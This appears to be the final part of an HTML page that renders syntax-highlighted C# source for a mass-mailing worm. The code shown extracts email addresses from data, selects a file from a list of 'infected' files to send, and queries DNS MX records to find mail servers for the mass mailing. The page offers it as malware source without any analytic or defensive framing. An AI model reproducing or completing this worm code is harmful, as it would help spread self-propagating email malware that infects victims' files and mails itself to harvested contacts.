                    </span><span class="sc11">p2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//strip out any html and do some extra clean up
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">InputData</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p2</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc13">@"&lt;(.|\n)*?&gt;"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc13">@""""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//since we don't need to send the exact copy we can just
</span><span class="sc0">        </span><span class="sc2">//send a file that was infected we get a file from the
</span><span class="sc0">        </span><span class="sc2">//infected arraylist.
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetFile</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arInfect</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">enumInfect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arInfect</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">enumInfect</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">dest</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">enumInfect</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">dest</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc3">/***
         * Dns mx query used for the mass mailing we get the hosts
         * from the host portion of the emails we get. This way we
         * aren't hard coding mail servers or any junk like that.
         * If it doesn't find a mx record then we try the original
         * host that we passed in.
         ***/</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetMXRecords</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">IntPtr</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc10">.</span><span class="sc11">Zero</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">IntPtr</span><span class="sc0"> </span><span class="sc11">p2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc10">.</span><span class="sc11">Zero</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">STRMX</span><span class="sc0"> </span><span class="sc11">mx</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Dns</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">server</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">num1</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">server</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">p2</span><span class="sc10">.</span><span class="sc11">Equals</span><span class="sc10">(</span><span class="sc11">IntPtr</span><span class="sc10">.</span><span class="sc11">Zero</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">p2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mx</span><span class="sc10">.</span><span class="sc11">pNext</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">mx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">STRMX</span><span class="sc10">)</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">PtrToStructure</span><span class="sc10">(</span><span class="sc11">p2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">STRMX</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mx</span><span class="sc10">.</span><span class="sc11">sType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">text1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">PtrToStringAuto</span><span class="sc10">(</span><span class="sc11">mx</span><span class="sc10">.</span><span class="sc11">pNameEx</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">text1</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">server</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">text1</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">server</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//our struct for GetMxRecords 
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">STRMX</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc0"> </span><span class="sc11">pNext</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">strName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">sType</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intFlag</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intTTL</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">intRes</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">IntPtr</span><span class="sc0"> </span><span class="sc11">pNameEx</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
